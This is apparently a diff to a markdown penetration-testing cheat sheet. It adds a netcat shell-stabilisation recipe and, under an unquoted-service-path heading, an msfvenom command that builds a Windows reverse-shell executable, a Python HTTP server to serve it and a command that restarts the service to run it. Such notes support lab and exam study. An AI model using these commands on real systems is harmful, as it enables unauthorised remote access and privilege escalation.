@@ -1,10 +1,3 @@
----
-date: '2022-01-26'
-title: Resources and Tools
-root: '/contents'
-parents: ["Resources and Tools"]
----
-
 # Enumeration
 ## NMAP
 ```
@@ -99,14 +92,18 @@ type
 ```
 
 ```
-stty raw -echo; fg
+
 ```
 ## netcat
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ```
-
+stty raw -echo; fg
+reset
+export SHELL=bash
+export TERM=xterm256-color
+stty rows 38 columns 116
 ```
 ```
 
@@ -160,6 +157,11 @@ nmap --script=$TF
 ## Unquoted Service Path
 ```
 sc qc unquotedsvc
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > common.exe
+
+Python3 -m http.server 4444
+
+Get-service -Name unquotedsvc | Restart-Service
 ```
 
 ## AlwaysInstallElevated
